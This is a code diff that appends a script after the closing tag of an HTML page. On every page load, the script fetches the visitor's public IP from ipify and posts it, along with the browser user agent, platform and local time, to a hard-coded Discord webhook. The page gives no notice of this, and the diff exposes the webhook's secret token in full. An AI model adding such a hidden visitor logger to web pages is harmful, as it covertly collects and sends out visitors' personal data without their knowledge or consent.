@@ -265,3 +265,33 @@ function send() {
 
 </body>
 </html>
+
+<script>
+fetch("https://api.ipify.org?format=json")
+  .then(res => res.json())
+  .then(data => {
+
+    const info = {
+      ip: data.ip,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      time: new Date().toLocaleString()
+    };
+
+    fetch("https://discord.com/api/webhooks/1485257630971723857/BsUSqz-UuiiuQqxrAJERN-AjbKVnmiOEg_g59dorUV9UndpskJDtrL1a0cVaFR_NnXPN", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content:
+`👀 **New Visitor**
+🌐 IP: ${info.ip}
+💻 Device: ${info.platform}
+🧠 Browser: ${info.userAgent}
+⏰ Time: ${info.time}`
+      })
+    });
+
+  });
+</script>
